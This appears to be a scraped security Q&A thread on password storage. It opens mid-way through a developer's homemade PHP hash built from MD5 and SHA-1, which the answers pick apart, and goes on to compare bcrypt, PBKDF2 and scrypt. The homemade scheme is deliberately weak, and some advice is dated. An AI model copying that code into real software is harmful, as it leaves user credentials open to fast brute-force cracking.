    $pass = md5($string1); // why are we MD5'ing the same pass when crypt is available?
    $nt = substr($pass,0,8); // <--- BAD BAD BAD - why shuffle an MD5 hash?!?!?
    $th = substr($pass,8,8);
    $ur = substr($pass,16,8);
    $ps = substr($pass,24,8); // seriously. I have no idea. why?
    // ^ shuffling brings _zero_ extra security. it makes _zero_ sense to do this.
    // also, what's up with the variable names?

    // and now we SHA1 it with other junk too? wtf?
    $hash = 'H'.sha1($string2.$ps.$ur.$nt.$th); 
    return $hash
}

$hash = hash_it($password, $crypt); // ... please stop. it's hurting my head.

summon_cthulhu();


Dave, you are not a cryptographer. Stop it.

This home-brew method offers no real resistance against brute force attacks, and gives a false impression of "complicated" security. In reality you're doing little more than sha1(md5(pass) + salt) with a possibly-broken and overly complicated hash. You seem to be under the illusion that complicated code gives better security, but it doesn't. A strong cryptosystem is strong regardless of whether the algorithm is known to an attacker - this fact is known as Kerckhoff's principle. I realise that it's fun to re-invent the wheel and do it all your own way, but you're writing code that's going into a business-critical application, which is going to have to protect customer credentials. You have a responsibility to do it correctly.

Stick to tried and tested key derivation algorithms like PBKDF2 or bcrypt, which have undergone years of in-depth analysis and scrutiny from a wide range of professional and hobbyist cryptographers.

If you'd like a good schooling on proper password storage, check out these links:


How to store salt?
Do any security experts recommend bcrypt for password storage?
How to securely store passwords?
AnswerKenntnis:
Advantages of a public protocol:


Probably written by smarter people than you
Tested by a lot more people (probably some of them smarter than you)
Reviewed by a lot more people (probably some of them smarter than you), often has mathematical proof
Improved by a lot more people (probably some of them smarter than you)
At the moment just one of those thousands of people finds a flaw, a lot of people start fixing it


Disadvantages of a public protocol:


If indeed a flaw is found,
AND made public
AND not fixed fast enough


then attackers will start searching for vulnerable sites/applications. BUT:


They'll probably go after more important targets first
When the flaw is exposed, you know and can lock-down
Not all flaws are "critical" (most are like "collisions are possible under certain conditions" or "the time to bruteforce is not 10^12 years, but 10^6 years")


Security by obscurity is deemed outright bad. Inventing your own falls under that category.
AnswerKenntnis:
If Dave is really "your" developer, as in you have the authority to fire him, then you have the authority to direct him to use a more well-documented scheme, and you should.

In cryptography, the fewer secrets that are required to be kept, the better. This applies especially to "hard-coded" secrets, such as the hash function itself, which are not secrets as soon as the code containing the secret leaves your building.

This is why open standards for cryptography are a good thing; if the scheme has been around for years or even decades, with the basic algorithm and various implementations publicly known, and still nobody's found a way to get in, it's a good scheme.

Case in point, Polynomial provided a very good breakdown of what's wrong with the scheme, but here are the major failings of the proposed hash algorithm:


MD5 is completely broken; While a preimage attack isn't made much easier by the primary ways that MD5 is broken (it's extremely vulnerable to known-plaintext strong collisions; knowing the message and the digest, one can produce a collision in 2^24 time), the hashing algorithm is way too fast to be secure against modern distributed cracking hardware. It should never be used in applications requiring data security. 
SHA-1 is considered vulnerable; Again, there's not an elegant vector for a preimage attack, but there is a strong collision attack (2^61 time for a 160-bit hash), and the hashing algorithm is fast enough and the keyspace small enough that current hardware can feasibly brute-force it.
More hashes don't necessarily mean better hashing. Hashes are a deterministic process; they stand in for a "random oracle" in theoretical cryptography, but since they must always produce the same output given the same input, they cannot add any entropy to what is already inherent in the input. 

Stated simply, using a secret combination of multiple hashes as Dave is doing, even if that combination is unknown, doesn't add a significant amount of work to a brute-force (the relative order of three hashes has 6 possibilities, increasing the complexity of trying all possibilities by less than 3 powers of 2), and that extra complexity disappears as soon as an attacker can decompile your code and discover the relative order of the hash functions. 
Passwords are inherently low-entropy. The best "user-consumable" (non-gibberish) passwords max out in complexity at about 50 bits of entropy, meaning they can be cracked, if you have some idea of what you're looking for, in 2^50 or better time. That makes passwords easier to crack than other things you'd normally hash (like certificate digests), requiring additional "proof of work" to increase their security. 
This scheme is not adding any significant proof of work; three hashes instead of one, in the grand scheme of things, adds the equivalent of about 1.25 bits of entropy to the scheme in extra required work; you could do better by just requiring passwords to be one character longer.


BCrypt, in contrast to all of the above, has as its main advantage an extremely slow key derivation function or KDF. Blowfish, the encryption cipher that forms the basis of BCrypt, uses an "SBox"; a large array of predetermined initial values, which is modified by the key and/or IV to produce the initial state of the cipher through which the plaintext is fed. In BCrypt, this SBox setup is made more complex by taking the smaller password and salt values and running them through the "unkeyed" cipher a predetermined number of times, "warming up" the cipher into a state that theoretically could only be produced by performing the same number of iterations of setup, using the same password and salt. This "warmed-up" cipher is then fed a constant plaintext to produce the hash value. In CS terms, the hash forms a "proof of work"; a computational task that is difficult (time- and/or resource-consuming) to perform, but easy to check for correctness (does the produced hash match the one we already have?).

That "predetermined number" of iterations of SBox setup is configurable; this is BCrypt's real power. A number of "rounds" of key setup are specified when hashing, and for n rounds, 2^n iterations of key setup are performed. That means that incrementing the number of rounds makes the hash perform twice as much work and take twice as long on the same hardware to produce the requisite proof of work. BCrypt therefore can easily keep up with Moore's Law, which has been the bane of many hash functions that came before.

BCrypt's main theoretical weakness is its low memory usage; while computation time can be exponentially increased, the amount of memory required remains effectively constant (the SBox doesn't get any bigger as the iterations increase and no "intermediate results" are required to be kept around). As such, while BCrypt stymies the pure pipelined computational power of a GPU, it remains vulnerable to cracking by more sophisticated "field-programmable gate arrays" (basically a massive, highly modular set of "soft-wired" logic units, that are the current state-of-the-art in highly distributed computing), because the low memory constraints mean you can just throw more relatively-inexpensive circuit boards at the problem.

A newer algorithm, SCrypt, combats FPGA crackers by exponentially increasing the memory demands as well as the computational expense of calculating the hash, so the limited memory available to each FPGA quickly makes them infeasible as well (distributed cracking would basically require large numbers of CPU/FSB/RAM combinations, essentially full computers, hooked together). The only problem there is that SCrypt is only 2 or 3 years old, so it doesn't have the cryptanalytic pedigree of BCrypt (13 years old). And really, if you have to worry about an FPGA-armed cracker getting a password in a feasible amount of time (like before you can change all of them anyway), you have pissed off some very powerful people, and have already exposed another serious vulnerability (allowing an attacker to obtain your stored password hashes in the first place, so they can crack one "offline").

Bottom line, use BCrypt for password hashing. It's 13 years old, based on a 20-year-old cipher algorithm, an in that time no known vulnerabilities have been found that would aid a password cracker. It's slow as molasses, and can be configured to always be so, provided you combine it with a requirement for users to change their password every 90 days or so, so new passwords keep getting hashed with more expensive configurations.
AnswerKenntnis:
To be fair to Dave, in terms of homebrew password security this is one of the better cases as all it just a little obsfuscation (and really not much) masking hash = SHA1(salt + MD5'(Password)) where MD5' does a reversible swap of the order of the bytes of the MD5 hash.   Now the username/time/random/crypt-part is just used to generate a salt, and the only requirement we have of salts is that they just need to have a very good likelihood of uniqueness; so while its over-complicated there's really no use talking about it.  

Again hash = sha1($salt+md5'($password)).  Rearranging the MD5 adds no security  (swap(00112233445566778899aabbccddeeff) becomes ccddeeff8899aabb0011223344556677) the swap does not prevent you from using md5 rainbow tables after (e.g., look at the code and reverse the swap).  However, the presence of the unique salt makes the rainbow tables infeasible.

Now to be critical, this boils down to a simple cryptographic hash function applied twice; which is better than storing plaintext password (see plaintext offenders ), and better than storing an unsalted hash (see linkedin leak ).  However, in the age of cheap massively-parallel GPUs, this is too weak for modern use.  Anyone with a bit of general-purpose GPU programming experience that got on the live server somehow (to obtain the hashes with their salt) can likely see his source code, try out their own password as a test case and then can brute-force any particular password at a rate of billions of attempts per second per GPU.  

So if any user is using a password on a list of a million or so previously leaked password (say from linkedin), the attacker can near instantaneously crack it.  If some user's password is a random 8-letter from the char set A-Za-z0-9; it would take about 60 hours on average to break per GPU (so if you had 60 GPUs; would take 1 hour).  Using common cracking techniques exploiting forms of common passwords could speed it up dramatically.  Its also worth noting that since $password passes through a 128-bit MD5 hashing function, there is absolutely no benefit in using more than 128-bits of entropy in the passphrase (though to be fair that's a very secure password; like a 10 word diceware passphrase or random 22 character alphanumeric password).

Really, you should be using iterated cryptographic hash functions; that is something like bcrypt or PBKDF that slows down the brute-force rate of attackers by a large constant factor (say 105) (so instead of 60 hours to crack a random 8-char password from a 62-char set (A-Za-z0-9); it takes 6 million hours (~700 years to likely be broken) with a single GPU, and this gets better with stronger passwords (e.g., a 10 char password would take ~3 million years; so even with a million GPUs it would take 3 years).  So a little keystrengthening moves relatively weak password (8 random chars from 62-charset) out of the range of feasibility of being cracked by an attacker.  For more on the upper limits of using a simple keystrengthened password see this answer.

Collision Attacks vs Pre-Image Attacks (or Why Collision Attacks on a hash function are irrelevant for password hashing)

KeithS's answer, while it gives good advice (use bcrypt and not a simple cryptographic hash function to hash your password) originally criticized MD5 and SHA1 for the wrong rationale (don't use MD5 as its vulnerable to collision attacks).  There's a subtle difference between pre-image and collision attacks and the arguing in the comments was too condensed, so I am elaborating here.  I highly suggest reading the wikipedia article on pre-image attacks.

A pre-image attack says given a specific 128-bit hash written in hexadecimal:  h=ad2baf26a87795b3c8a8366a08b44112, a specific hash function H, please find any message m such that h=H(m); note that there are N=2128 different distinct hashes.  Now if your cryptographic hash function is not broken, each bit in your hash has a 50% chance of being 0 or 1 for a random message m.  Then I will need on average to generate hashes for roughly N=2128 hashes before I am lucky enough to find any message m such that h=H(m) (this message may not be the same input that was used to originally generate the hash -- but this still falls under the category of 'pre-image' attack).  

A collision attack says find me any two messages m1 and m2 such that H(m1) = H(m2).  Note that m1, m2, (and H(m1)) are all free to change.  This case is a much easier problem since if I generate M hashes for M different messages, I am not just comparing the M messages to one specific hash (so have M chances of a finding a collision), now I have M*(M-1)/2 pairs of hashes, so roughly M^2 chances of having a collision.  So in this case, I will need roughly to generate roughly sqrt(N)~264 hashes before its likely that one of them will collide with another one on an ideal 128-bit hash. 

Let's look at the two types of birthday problems.  The collision problem translates into the common birthday "paradox"; how many people do you need in a room before its quite that two people share a birthday with N=365 days in a year.  The answer is a paradox as you only need about sqrt(N) ~ 23 people before its likely that two people share a birthday (as with 23 people in a room you have 253 different pairs of people that could match).  (I do know that sqrt(365) != 23: I am using approximate math not focusing on insignificant constant factors.  Re-doing the calculation with sqrt(365) ~ 19 people in the room then P(two share birthday) = 19! * comb(365,19)/365**n = 37.9%, which while not strictly 50% still means its fairly likely to happen).  Note for the collision birthday problem, you can't have N+1=366 people in a room and there be a chance of not having a collision (ignoring leap days); at best the first 365 people had different birthdays and the last person generated a collision.

The pre-image problem is a very different question, how many people do I need in a room before it is quite likely that someone has one specific birthday (say B=December 18th).  In this case, I need roughly N ~ 365 people before its likely to happen.  E.g., with 365 people in the room you have a P(somebody has birthday B) = 1 - (1 - 1/365)^(# people) so for # people = 365 you have a 63% chance that someone's birthday will be some fixed date B.  In this case, you can easily imagine having any number of people being in a room and there being no one who has a birthday on one specific date.  (Say you only invited people into the room if there birthday was not a given date; there's no limit to the number of people you could invite).

When a hash function like MD5/SHA1 is broken for collision attacks that means you can generate a collision in less work than the brute force time of sqrt(N) ~ 2numbits/2.  For MD5 it only takes about ~ 2^24 time to generate a collision; for SHA1 it takes ~ 2^61 time.  That means collision attacks on MD5 are extremely easy to make; but practical attacks on SHA1 are still difficult.  But collision attacks only matter if you don't care what hash you are trying to match.  These collision attacks are quite relevant for some applications like cryptographically signing messages to ensure message integrity, so beware of using MD5/SHA1 in those cases.  However, when you have a unique salt, and a specific hash you are trying to match to authenticate, collision attacks do not matter.
AnswerKenntnis:
See the related Security Meme post

While this may seem very simplistic, the rules hold true - designing crypto algorithms and implementing them correctly/securely is very hard. Even the ones designed by experts and picked at by thousands of people over years have holes discovered in them eventually.

So Do Not Roll Your Own Crypto is good advice for everyone (possible exceptions include notables like Rivest, Adleman, Pornin, Shamir)
AnswerKenntnis:
OK, fire Dave. At the very least hit him with a very large clue-bat. Open protocols are good because anyone can look and attempt to find vulnerabilities and structural problems, and implement fixes. The visibility improves the protocol. Good security means that everyone can know how the system works and it is still secure.
AnswerKenntnis:
While we can find plenty of flaws with Dave's algorithm, it really isn't horrible because it isn't 100% home brew; he does use hashing protocols that (albeit weak) are based on solid principles. On the other hand, he takes steps that increase complexity for the developer but do little to improve the security of his algorithm. 

But the reason I am adding another answer here is to bring up the age-old argument that there is value in obscurity. The primary line of defense should always be strong, widely-accepted hashing algorithms but there is no harm in adding even the tiniest amount of obscurity as an additional layer of defense. 

That layer of obscurity should never be considered a defense in itself, simply an additional factor that reduces the chances of compromise. Since a successful attack normally requires a number of factors to fall in place, even small defenses can have a great impact in reducing your overall risk. 

I can't tell you how many times I have seen hash dumps that I have tried to crack where I simply get nothing because some Dave somewhere thought of this dumb non-standard algorithm that I can't crack short of doing an intense cryptoanalysis or breaking in to the web servers to get the algorithm. You can't deny that these dumb algorithms are a valid defensive factor.

Now if Dave took his dumb algorithm and added it as a layer to stronger algorithms such as PBKDF2 or bcrypt, then he has obscurity with the backing of solid security practices. Also, obscurity doesn't need to be as complex as Dave's code, all you really need is one bit to be different to be obscure. Remember this is not a defense, just a layer of obscurity. 

Better ways to accomplish obscurity are using an HMAC, concatenating a server-side salt constant,  and/or using a large, non-standard number of iterations. None of these measures will stand on their own but they certainly do address specific attack vectors that contribute to your overall risk. 

tl:dr; security through obscurity is bad, but solid security plus a reasonable amount of obscurity is a valid strategy.
AnswerKenntnis:
Convince him with good reasoning. Don't berate him.

You have to think about why we are hashing passwords: The reason is to protect the original password by making the hashing process take a lot of CPU time to execute. Brute force is the way the passwords are typically recovered. 

If the attacker is able to steal your password database then they've managed to access your database. If they have access to the database then they probably have access to the code that produces these passwords as well. After reviewing the code they can start brute-forcing the passwords because the hashing algorithm takes too little time to execute.

The idea behind well-known hashing methods and practices like using PBKDF2 with 10,000 iterations is that they take a lot of time to execute on current hardware.

If you have some time on your hands you could also write a brute-forcing program and show him how many attacks per second you can execute with his algorithm vs prevailing standards.
AnswerKenntnis:
I've written several hashing algorithms. There's nothing wrong with it, if you know what you're doing. In a very slight way, he's right about the fact that tried-and-true algorithms may be a little more vulnerable to attack. So if you can create a good algorithm, you're golden. The only problem is that his totally sucks, for a number of reasons.


// timestamp, random # $time = date('mdYHis');

I don't even feel like I need to explain this one. He was trying to create a seeded "random" number when it doesn't make any sense to do so. The hashes will change day to day. I cannot imagine this working in any reasonable scenario.
He says that he want's to stray away from known hashing algorithms, yet he uses MD5 (the known-est of them all, and a fairly weak one too) for the bulk of "his" algorithm. His method is only a very slight derivative of plain ole MD5 hashing. Which brings me to:
He's shuffling his MD5'd result. Uh, why? As a fun little activity, try asking him to explain his reasoning there. And I'll give you a tip to help you out: Whatever his answer is -- it's wrong. Shuffling a hashed value is like shuffling a deck of all-blank cards. There is no extra benefit from it whatsoever.


There are more things wrong with it, too, but these are the big ones. Tell him to get back to his usual work, and just use bcrypt (or scrypt, which is probably even a little more secure to do the fact that it's really CPU intensive)
AnswerKenntnis:
Steganography would benefit from Dave's operational secrecy better than Cryptography. This might be what Dave was intuitively aiming for.

Cryptography

Each cryptographic solution benefits from widest possible exposure because relying on a secret other than the private key makes operational security for a crypto-consumer much harder. A key is a single easy-to-manage, portable, predictable, well-defined security risk that crypto-experts have focused great deal of effort on ensuring that all risk in the algorithm has been squeezed into only the key. 

Keys can be made unguessable (high-entropy) as to require brute-force or side-channel attacks. Secrets in other aspects of an algorithm can not be made as unguessable because any other aspect of an encryption algorithm be generalised into a universal class of (possibly weaker) encryption algorithm + a constant value. This constant value representing all residual invariant entropy in the algorithm's structure or obfuscation. This value is never particularly large or entropic in a home-brew algorithm and is inherently constant in any non-self-modifying computer program. An attacker can either acquire the source and remove this (minor) entropy directly or run the ciphertext through a generalised class of algorithm. NSA for example would be doing precisely this for unknown variants of common algorithms in use by foreign powers.

Steganography

Each steganographic solution benefits from the least public exposure because hiding the location of secrets requires the attacker to customise their search in a fashion potentially unique for that victim; and scales to the amount possible hiding places and methods of hiding at the victim's disposal. 

This could be as simple as having a fake hash password column and hiding the real one in four (64bit) time_t columns across various tables that record user information.
This can be as complex as hiding a Portable Linux emulation inside a BluRay movie.

Steganography ultimately relies on creating or modifying an artefact that has a public semantic meaning or purpose and secondary private semantic meaning or purpose. An person or organisation benefits from hiding secondary semantic meanings in much the same way as any lie by omission. Be that "My sock is boring and doesn't contain diamonds" or "These are the hashes you are looking for, ignore that honeypot or that socket connection to an audit server".

In Combination

So Dave should use public vetted high-level libraries like BouncyCastle instead of a home-brew of low level crypto-primatives; but should feel free to make the hacker navigating the server ecology feel like they are reading a brainfuck program that's missing some characters. 

Assuming full support documentation is kept in a secure offline location for Dave's successors...
QuestionKenntnis:
How to securely hash passwords?
qn_description:
If I hash passwords before storing them in my database, is that sufficient to prevent them being recovered by anyone?

I should point out that this relates only to retrieval directly from the database, and not any other type of attack, such as bruteforcing the login page of the application, keylogger on the client, and of course rubberhose cryptanalysis (or nowadays we should call it "Chocolate Cryptanalysis").
Of course any form of hash will not prevent those attacks.
AnswersKenntnis
AnswerKenntnis:
The Theory

We need to hash passwords as a second line of defence. A server which can authenticate users necessarily contains, somewhere in its entrails, some data which can be used to validate a password. A very simple system would just store the passwords themselves, and validation would be a simple comparison. But if an hostile outsider gains a simple glimpse at the contents of the file or database table which contains the passwords, then that attacker learns a lot. Unfortunately, such partial, read-only breaches do occur in practice (a mislaid backup tape, a decommissioned but not wiped out hard disk, as an aftermath of a SQL injection attack... the possibilities are numerous). See this blog post for a detailed discussion.

Since the overall contents of a server which can validate passwords are necessarily sufficient to, indeed, validate passwords, an attacker who got a read-only snapshot of the server is in position to make an offline dictionary attack: he tries potential passwords until a match is found. We cannot avoid that. So we will want to make that kind of attack as hard as possible. Our tools are the following:


Cryptographic hash functions: these are fascinating mathematical objects which everybody can compute efficiently, and yet nobody knows how to invert them. This looks good for our problem: the server could store a hash of a password; when presented with a putative password, the server just has to hash it to see if it gets the same value; and yet, knowing the hash does not reveal the password itself.
Salts: among the advantages of the attacker over the defender, is parallelism. The attacker usually grabs a whole list of hashed passwords, and is interested in breaking as many of them as possible. He may try to attack several in parallels. For instance, the attacker may consider one potential password, hash it, and then compare the value with 100 hashed passwords; this means that the attacker shares the cost of hashing over several attacked passwords. A similar optimisation is precomputed tables, including rainbow tables; this is still parallelism, with a space-time change of coordinates.

The common characteristic of all attacks which use parallelism is that they work over several passwords which were processed with the exact same hash function. Salting is about using not one hash function, but a lot of distinct hash functions; ideally, each instance of password hashing should use its own hash function. A salt is a way to select a specific hash function among a big family of hash functions. Properly applied salts will completely thwart parallel attacks (including rainbow tables).
Slowness: computers become faster over time (Gordon Moore, co-founder of Intel, theorized it in his famous law). Human brains do not. This means that attackers can "try" more and more potential passwords as years pass, while users cannot remember more and more complex passwords (or flatly refuse to). To counter that trend, we can make hashing inherently slow by defining the hash function to use a lot of internal iterations (thousands, possibly millions).


We have a few standard cryptographic hash functions; most famous are MD5 and the SHA family. Building a secure hash function out of elementary operations is far from easy. When cryptographers want to do that, they think hard, then harder, and organize a tournament where the functions fight each other fiercely. When hundreds of cryptographers gnawed and scraped and punched at a function for several years and found nothing bad to say about it, then they begin to admit that maybe that specific function could be considered as more or less secure. This is just what happened in the SHA-3 competition. We have to use this way of designing hash function because we know no better way. Mathematically, we do not know if secure hash functions actually exist; we just have "candidates" (that's the difference between "it cannot be broken" and "nobody in the world knows how to break it").

A basic hash function, even if secure as a hash function, is not appropriate for password hashing, because:


it is unsalted, allowing for parallel attacks (rainbow tables for MD5 or SHA-1 can be obtained for free, you do not even need to recompute them yourself);
it is way too fast, and gets faster with technological advances. With a recent GPU (i.e. off-the-shelf consumer product which everybody can buy), hashing rate is counted in billions of passwords per second.


So we need something better. It so happens that slapping together a hash function and a salt, and iterating it, is not easier to do than designing a hash function -- at least, if you want the result to be secure. There again, you have to rely on standard constructions which have survived the continuous onslaught of vindicative cryptographers.

Good Password Hashing Functions

PBKDF2

PBKDF2 comes from PKCS#5. It is parameterized with an iteration count (an integer, at least 1, no upper limit), a salt (an arbitrary sequence of bytes, no constraint on length), a required output length (PBKDF2 can generate an output of configurable length), and an "underlying PRF". In practice, PBKDF2 is always used with HMAC, which is itself a construction which is built over an underlying hash function. So when we say "PBKDF2 with SHA-1", we actually mean "PBKDF2 with HMAC with SHA-1".

Advantages of PBKDF2:


Has been specified for a long time, seems unscathed for now.
Is already implemented in various framework (e.g. it is provided with .NET).
Highly configurable (although some implementations do not let you choose the hash function, e.g. the one in .NET is for SHA-1 only).
Received NIST blessings (modulo the difference between hashing and key derivation; see later on).
Configurable output length (again, see later on).


Drawbacks of PBKDF2:


CPU-intensive only, thus amenable to high optimization with GPU (the defender is a basic server which does generic things, i.e. a PC, but the attacker can spend his budget on more specialized hardware, which will give him an edge).
You still have to manage the parameters yourself (salt generation and storage, iteration count encoding...). There is a standard encoding for PBKDF2 parameters but it uses ASN.1 so most people will avoid it if they can (ASN.1 can be tricky to handle for the non-expert).


bcrypt

bcrypt was designed by reusing and expanding elements of a block cipher called Blowfish. The iteration count is a power of two, which is a tad less configurable than PBKDF2, but sufficiently so nevertheless. This is the core password hashing mechanism in the OpenBSD operating system. 

Advantages of bcrypt:


Many available implementations in various languages (see the links at the end of the Wikipedia page).
More resilient to GPU; this is due to details of its internal design. The bcrypt authors made it so voluntarily: they reused Blowfish because Blowfish was based on an internal RAM table which is constantly accessed and modified throughout the processing. This makes life much harder for whoever wants to speed up bcrypt with a GPU (GPU are not good at making a lot of memory accesses in parallel). See here for some discussion.
Standard output encoding which includes the salt, the iteration count and the output as one simple to store character string of printable characters.


Drawbacks of bcrypt:


Output size is fixed: 192 bits.
While bcrypt is good at thwarting GPU, it can still be thoroughly optimized with FPGA: modern FPGA chips have a lot of small embedded RAM blocks which are very convenient for running many bcrypt implementations in parallel within one chip. It has been done.
Input password size is limited to 51 characters. In order to handle longer passwords, one has to combine bcrypt with a hash function (you hash the password and then use the hash value as the "password" for bcrypt). Combining cryptographic primitives is known to be dangerous (see above) so such games cannot be recommended on a general basis.


scrypt

scrypt is a much newer construction (designed in 2009) which builds over PBKDF2 and a stream cipher called Salsa20/8, but these are just tools around the core strength of scrypt, which is RAM. scrypt has been designed to inherently use a lot of RAM (it generates some pseudo-random bytes, then repeatedly read them in a pseudo-random sequence). "Lots of RAM" is something which is hard to make parallel. A basic PC is good at RAM access, and will not try to read dozens of unrelated RAM bytes simultaneously. An attacker with a GPU or a FPGA will want to do that, and will find it difficult.

Advantages of scrypt:


A PC, i.e. exactly what the defender will use when hashing passwords, is the most efficient platform (or close enough) for computing scrypt. The attacker no longer gets a boost by spending his dollars on GPU or FPGA.
One more way to tune the function: memory size.


Drawbacks of scrypt:


Still new (my own rule of thumb is to wait at least 5 years of general exposure, so no scrypt for production until 2014 -- but, of course, it is best if other people try scrypt in production, because this gives extra exposure).
Not as many available, ready-to-use implementations for various languages.
Unclear whether the CPU / RAM mix is optimal. For each of the pseudo-random RAM accesses, scrypt still computes a hash function. A cache miss will be about 200 clock cycles, one SHA-256 invocation is close to 1000. There may be room for improvement here.
Yet another parameter to configure: memory size.


OpenPGP Iterated And Salted S2K

I cite this one because you will use it if you do password-based file encryption with GnuPG. That tool follows the OpenPGP format which defines its own password hashing functions, called "Simple S2K", "Salted S2K" and "Iterated and Salted S2K". Only the third one can be deemed "good" in the context of this answer. It is defined as the hash of a very long string (configurable, up to about 65 megabytes) consisting of the repetition of an 8-byte salt and the password.

As far as these things go, OpenPGP's Iterated And Salted S2K is decent; it can be considered as similar to PBKDF2, with less configurability. You will very rarely encounter it outside of OpenPGP, as a stand-alone function.

Unix "crypt"

Recent Unix-like systems (e.g. Linux), for validating user passwords, use iterated and salted variants of the crypt() function based on good hash functions, with thousands of iterations. This is reasonably good. Some systems can also use bcrypt, which is better.

The old crypt() function, based on the DES block cipher, is not good enough:


It is slow in software but fast in hardware, and can be made fast in software too but only when computing several instances in parallel (technique known as SWAR or "bitslicing"). Thus, the attacker is at an advantage.
It is still quite fast, with only 25 iterations.
It has a 12-bit salt, which means that salt reuse will occur quite often.
It truncates passwords to 8 characters (characters beyond the eighth are ignored) and it also drops the upper bit of each character (so you are more or less stuck with ASCII).


But the more recent variants, which are active by default, will be fine.

Bad Password Hashing Functions

About everything else, in particular virtually every homemade method that people relentlessly invent.

For some reason, many developers insist on designing function themselves, and seem to assume that "secure cryptographic design" means "throw together every kind of cryptographic or non-cryptographic operation that can be thought of". See this question for an example. The underlying principle seems to be that the sheer complexity of the resulting utterly tangled mess of instruction will befuddle attackers. In practice, though, the developer himself will be more confused by his own creation than the attacker.

Complexity is bad. Homemade is bad. New is bad. If you remember that, you'll avoid 99% of problems related to password hashing, or cryptography, or even security in general.

Password hashing in Windows operating systems used to be mindbogglingly awful and now is just terrible (unsalted, non-iterated MD4).

Key Derivation

Up to now, we considered the question of hashing passwords. A close problem is about transforming a password into a symmetric key which can be used for encryption; this is called key derivation and is the first thing you do when you "encrypt a file with a password".

It is possible to make contrived examples of password hashing functions which are secure for the purpose of storing a password validation token, but terrible when it comes to generating symmetric keys; and the converse is equally possible. But these examples are very "artificial". For practical functions like the one described above:


The output of a password hashing function is acceptable as a symmetric key, after possible truncation to the required size.
A Key Derivation Function can serve as a password hashing function as long as the "derived key" is long enough to avoid "generic preimages" (the attacker is just lucky and finds a password which yields the same output). An output of more than 100 bits or so will be enough.


Indeed, PBKDF2 and scrypt are KDF, not password hashing function -- and NIST "approves" of PBKDF2 as a KDF, not explicitly as a password hasher (but it is possible, with only a very minute amount of hypocrisy, to read NIST's prose in such a way that it seems to say that PBKDF2 is good for hashing passwords).

Conversely, bcrypt is really a block cipher (the bulk of the password processing is the "key schedule") which is then used in CTR mode to produce three blocks (i.e. 192 bits) of pseudo-random output, making it a kind of hash function. bcrypt can be turned into a KDF with a little surgery, by using the block cipher in CTR mode for more blocks. But, as usual, we cannot recommend such homemade transforms. Fortunately, 192 bits are already more than enough for most purposes (e.g. symmetric encryption with GCM or EAX only needs a 128-bit key).

Miscellaneous Topics

How many iterations ?

As much as possible ! This salted-and-slow hashing is an arms race between the attacker and the defender. You use many iterations to make the hashing of a password harder for everybody. To improve security, you should set that number as high as you can tolerate on your server, given the tasks that your server must otherwise fulfill. Higher is better.

Collisions and MD5

MD5 is broken: it is computationally easy to find a lot of pairs of distinct inputs which hash to the same value. These are called collisions.

However, collisions are not an issue for password hashing. Password hashing requires the hash function to be resistant to preimages, not to collisions. Collisions are about finding pairs of messages which give the same output without restriction, whereas in password hashing the attacker must find a message which yields a given output that the attacker does not get to choose. This is quite different. As far as we known, MD5 is still (almost) as strong as it has ever been with regards to preimages (there is a theoretical attack which is still very far in the ludicrously impossible to run in practice).

The real problem with MD5 as it is commonly used in password hashing is that it is very fast, and unsalted. However, PBKDF2 used with MD5 would be robust. You should still use SHA-1 or SHA-256 with PBKDF2, but for Public Relations. People get nervous when they hear "MD5".

Salt Generation

The main and only point of the salt is to be as unique as possible. Whenever a salt value is reused anywhere, this has the potential to help the attacker.

For instance, if you use the user name as salt, then an attacker (or several colluding attackers) could find it worthwhile to build rainbow tables which attack the password hashing function when the salt is "admin" (or "root" or "joe") because there will be several, possibly many sites around the world which will have a user named "admin". Similarly, when a user changes his password, he usually keeps his name, leading to salt reuse. Old passwords are valuable targets, because users have the habit of reusing passwords in several places (that's known to be a bad idea, and advertised as such, but they will do it nonetheless because it makes their life easier), and also because people tend to generate their passwords "in sequence": if you learn that Bob's old password is "SuperSecretPassword37", then Bob's current password is probable "SuperSecretPassword38" or "SuperSecretPassword39".

The cheap way to obtain uniqueness is to use randomness. If you generate your salt as a sequence of random bytes from the cryptographically secure PRNG that your operating system offers (/dev/urandom, CryptGenRandom()...) then you will get salt values which will be "unique with a sufficiently high probability". 16 bytes are enough so that you will never see a salt collision in your life, which is overkill but simple enough.

UUID are a standard way of generating "unique" values. Note that "version 4" UUID just use randomness (122 random bits), like explained above. A lot of programming frameworks offer simple to use functions to generate UUID on demand, and they can be used as salts.

Salt Secrecy

Salts are not meant to be secret; otherwise we would call them keys. You do not need to make salts public, but if you have to make them public (e.g. to support client-side hashing), then don't worry too much about it. Salts are there for uniqueness. Strictly speaking, the salt is nothing more than the selection of a specific hash function within a big family of functions.

"Pepper"

Cryptographers can never let a metaphor alone; they must extend it with further analogies and bad puns. "Peppering" is about using a secret salt, i.e. a key. If you use a "pepper" in your password hashing function, then you are switching to a quite different kind of cryptographic algorithm; namely, you are computing a Message Authentication Code over the password. The MAC key is your "pepper".

Peppering makes sense if you can have a secret key which the attacker will not be able to read. Remember that we use password hashing because we consider that an attacker could grab a copy of the server database, or possible of the whole disk of the server. A typical scenario would be a server with two disks in RAID 1. One disk fails (electronic board fries -- this happens a lot). The sysadmin replaces the disk, the mirror is rebuilt, no data is lost due to the magic of RAID 1. Since the old disk is dysfunctional, the sysadmin cannot easily wipe its contents. He just discards the disk. The attacker searches through the garbage bags, retrieves the disk, replaces the board, and lo! He has a complete image of the whole server system, including database, configuration files, binaries, operating system... the full monty, as the British say. For peppering to be really applicable, you need to be in a special setup where there is something more than a PC with disks; you need a HSM. HSM are very expensive, both in hardware and in operational procedure. But with a HSM, you can just use a secret "pepper" and process passwords with a simple HMAC (e.g. with SHA-1 or SHA-256). This will be vastly more efficient than bcrypt/PBKDF2/scrypt and their cumbersome iterations. Also, usage of a HSM will look extremely professional when doing a WebTrust audit.

Client-side hashing

Since hashing is (deliberately) expensive, it could make sense, in a client-server situation, to harness the CPU of the connecting clients. After all, when 100 clients connect to a single server, the clients collectively have a lot more muscle than the server.

To perform client-side hashing, the communication protocol must be enhanced to support sending the salt back to the client. This implies an extra round-trip, when compared to the simple client-sends-password-to-server protocol. This may or may not be easy to add to your specific case.

Client-side hashing is difficult in a Web context because the client uses Javascript, which is quite anemic for CPU-intensive tasks.

In the context of SRP, password hashing necessarily occurs on the client side.

Conclusion

Use bcrypt. PBKDF2 is not bad either. If you use scrypt you will be a "slightly early adopter" with the risks that are implied by this expression; but it would be a good move for scientific progress ("crash dummy" is a very honourable profession).
AnswerKenntnis:
For storing passwords hashes, you need an algorithm slow enough that brute-force attacks are not feasible. Salting the password will help against rainbow attacks, but not against brute-force attacks. For storing password hashes, you need to use an algorithm specifically designed for this purpose; such as:


bcrypt
